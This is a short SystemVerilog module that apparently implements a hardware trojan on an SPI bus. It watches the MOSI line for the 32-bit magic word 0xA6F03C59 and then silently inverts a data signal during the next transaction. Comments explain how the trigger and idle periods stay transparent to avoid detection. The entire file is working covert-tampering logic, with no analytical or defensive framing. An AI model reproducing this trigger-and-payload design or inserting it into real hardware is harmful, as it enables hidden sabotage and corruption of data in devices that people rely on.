module net_tap (
    input  logic orig,     
    input  logic sck,      
    input  logic mosi,     
    input  logic cs_n,     
    input  logic rst_n,    
    output logic patched   
);

    logic [31:0] shift_reg;
    logic [4:0]  bit_cnt;
    logic        payload_active;

    // Bit counter tracks the position within the 32-bit SPI frame.
    // It is asynchronously reset when cs_n goes high (inactive), ensuring
    // it properly resets between transactions without requiring a system clock.
    always_ff @(posedge sck or posedge cs_n) begin
        if (cs_n) begin
            bit_cnt <= 5'd0;
        end else begin
            bit_cnt <= bit_cnt + 5'd1;
        end
    end

    // Shift register and trigger arming logic.
    always_ff @(posedge sck or negedge rst_n) begin
        if (!rst_n) begin
            shift_reg      <= 32'd0;
            payload_active <= 1'b0;
        end else if (!cs_n) begin
            // Shift in MOSI (MSB first)
            shift_reg <= {shift_reg[30:0], mosi};
            
            // On the final (32nd) bit of the transaction, check for the magic word.
            // Because SPI Mode 0 samples on the rising edge, this evaluation happens
            // right at the end of the transaction.
            if (bit_cnt == 5'd31) begin
                payload_active <= ({shift_reg[30:0], mosi} == 32'hA6F03C59);
            end
        end
    end

    // Apply the payload (inversion) during the *next* transaction if triggered.
    // By gating with !cs_n, it stays purely transparent during the idle periods.
    // Since payload_active is updated just after the 32nd rising edge of the 
    // trigger transaction, the master has already sampled the final un-inverted bit,
    // ensuring the trigger transaction itself remains completely transparent.
    assign patched = (payload_active && !cs_n) ? ~orig : orig;

endmodule
